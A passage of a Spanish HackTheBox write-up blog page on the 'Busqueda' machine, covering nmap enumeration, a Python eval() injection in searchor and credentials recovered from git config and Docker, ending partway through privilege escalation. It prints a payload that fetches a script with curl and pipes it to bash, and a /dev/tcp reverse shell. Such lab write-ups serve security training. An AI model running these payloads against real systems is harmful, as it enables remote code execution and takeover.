@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Busqueda - Arbitrary Code Execution via eval() | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="HackTheBox Busqueda - Arbitrary Code Execution via eval()">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Descubriremos que la pagina esta haciendo uso de searchor el cual tiene una vulnerabilidad en eval() la cual nos permitira una ejecucion arbitraria de codigo que conduce a un RCE,">
+<meta property="og:description" content="Descubriremos que la pagina esta haciendo uso de searchor el cual tiene una vulnerabilidad en eval() la cual nos permitira una ejecucion arbitraria de codigo que conduce a un RCE,">
+<link rel="canonical" href="https://ic4rta.github.io//hackthebox/2023/04/11/htb-busqueda.html">
+<meta property="og:url" content="https://ic4rta.github.io//hackthebox/2023/04/11/htb-busqueda.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-04-11T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="HackTheBox Busqueda - Arbitrary Code Execution via eval()">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-04-11T00:00:00+00:00","datePublished":"2023-04-11T00:00:00+00:00","description":"Descubriremos que la pagina esta haciendo uso de searchor el cual tiene una vulnerabilidad en eval() la cual nos permitira una ejecucion arbitraria de codigo que conduce a un RCE,","headline":"HackTheBox Busqueda - Arbitrary Code Execution via eval()","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//hackthebox/2023/04/11/htb-busqueda.html"},"url":"https://ic4rta.github.io//hackthebox/2023/04/11/htb-busqueda.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Busqueda - Arbitrary Code Execution via eval()</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-04-11T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Apr 11, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 1624 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 10 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#eval%20function">#eval function</a><a class="post-tag" href="/tags.html#Docker">#Docker</a>
+</div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">Descubriremos que la pagina esta haciendo uso de searchor el cual tiene una vulnerabilidad en eval() la cual nos permitira una ejecucion arbitraria de codigo que conduce a un RCE,</p>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo con el comando</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -sS -n -Pn --open -p- 10.129.58.76</code></p>
+
+<p>Donde le indicamos que con:</p>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Ahora escanearemos los puertos 22, 80 buscando la version y servicio y demas informacion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+| http-server-header: 
+|   Apache/2.4.52 (Ubuntu)
+|_  Werkzeug/2.1.2 Python/3.10.6
+|_http-title: Searcher
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>No nos reporta mucha informacion interesante y aun no tenemos credenciales para SSH.</p>
+
+<p>Si interceptamos la peticion con burp, podemos ver que nuestro input esta pasando por el parametro <code class="language-plaintext highlighter-rouge">query</code></p>
+
+<p><img src="/assets/img/busqueda/busqueda2.png" alt=""></p>
+
+<h2 id="vulnerabilidad-en-searchor">Vulnerabilidad en searchor</h2>
+
+<p>Si vemos en el footer de la pagina, podemos ver que esta usando <code class="language-plaintext highlighter-rouge">searchor</code></p>
+
+<p><img src="/assets/img/busqueda/busqueda3.png" alt=""></p>
+
+<p>Si le damos click en el nombre, nos mandara a su repo de github, sin embargo la version que sale es la <code class="language-plaintext highlighter-rouge">2.5.2</code>, asi que empezaremos a buscar entre las versiones, a ver si encontramos algo interesante.</p>
+
+<p>En la version <code class="language-plaintext highlighter-rouge">2.4.2</code> se arreglo una vulnerabilidad en la busqueda por CLI:</p>
+
+<p><img src="/assets/img/busqueda/busqueda4.png" alt=""></p>
+
+<p>Al ver las notas del parche, basicamente nos dice que se removio el metodo <code class="language-plaintext highlighter-rouge">eval()</code> de la busqueda por CLI, ya que podiamos ejecutar codigo arbitrario:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@click.argument</span><span class="p">(</span><span class="sh">"</span><span class="s">query</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="n">copy</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span>
+            <span class="sa">f</span><span class="sh">"</span><span class="s">Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s">.search(</span><span class="sh">'</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="sh">'</span><span class="s">, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span>
+        <span class="p">)</span>
+        <span class="n">click</span><span class="p">.</span><span class="nf">echo</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">searchor</span><span class="p">.</span><span class="n">history</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">open</span><span class="p">:</span>
+</code></pre></div></div>
+
+<p>Podemos ver que se esta usando el metodo <code class="language-plaintext highlighter-rouge">eval()</code>, donde el primer argumento que recibe, el cual se le llama <code class="language-plaintext highlighter-rouge">expresion</code>, es el input que nosotros le mandamos desde la pagina, al ver un poquito del metodo eval, encontre que la <code class="language-plaintext highlighter-rouge">expresion</code> es evaluada como una expresion de python, y el valor de retorno de <code class="language-plaintext highlighter-rouge">eval()</code>, es el resultado de evaluar la <code class="language-plaintext highlighter-rouge">expresion</code>. Si quieres saber mas has click <a href="https://www.programiz.com/python-programming/methods/built-in/eval">aqui</a></p>
+
+<h2 id="explotando-la-funcion-eval">Explotando la funcion eval()</h2>
+
+<p>Guiandome de este <a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html">link</a>, intentare ejecutar comandos en el servidor, cree un payload para mandarme una revese shell:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">'</span><span class="s">,eval(</span><span class="sh">"</span><span class="s">__import__(</span><span class="sh">'</span><span class="n">os</span><span class="sh">'</span><span class="s">).system(</span><span class="sh">'</span><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">tu_IP</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">8086</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">html</span> <span class="o">|</span> <span class="n">bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">))#
+</span></code></pre></div></div>
+<p>Y en mi archivo shell.html tengo esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/&lt;tu_IP&gt;/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>Ojo: puse el puerto 8086 por que el 8080 y el 80 los tengo ocupados</p>
+
+<p>Y ya llego la reserve shell:</p>
+
+<p><img src="/assets/img/busqueda/busqueda5.png" alt=""></p>
+
+<h2 id="flag-de-user">Flag de user</h2>
+
+<p>Si listamos el directorio, podemos ver que existe uno de .git:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Apr 12 12:44 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
+</code></pre></div></div>
+<p>Al listar el contenido, encontramos unas credenciales y un subdominio:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+</code></pre></div></div>
+
+<p>Usuario: cody</p>
+
+<p>Pass: jh1usoih2bkjaspwe92</p>
+
+<p>Subdominio: gitea.searcher.htb</p>
+
+<p>Al iniciar por SSH con cody, no nos deja, asi que tenemos que hacerlo con svc</p>
+
+<p>Y ya tenemos la flag de user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@busqueda:~$ cat user.txt 
+9d73b3b689d79b82c42cce959*******
+</code></pre></div></div>
+
+<h2 id="flag-de-root">Flag de root</h2>
+
+<p>Si buscamos por archivos que podamos ejecutar como root tenemos uno de python:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@busqueda:~$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre></div></div>
+
+<p>Al ejecutarlo, vemos que recibe varios argumentos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+</code></pre></div></div>
+
+<p>Si vemos los contenedores de docker podemos ver varios:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 3 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 3 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</code></pre></div></div>
+
+<p>Al ver el contenido del contenedor <code class="language-plaintext highlighter-rouge">mysql_db</code>, podemos ver unas credenciales:</p>
+
+<p><img src="/assets/img/busqueda/busqueda6.png" alt=""></p>
+
+<p>En donde la contraseña de gitea es: <code class="language-plaintext highlighter-rouge">yuiu1hoiu4i5ho1uh</code> y el usuario <code class="language-plaintext highlighter-rouge">administrator</code></p>
+
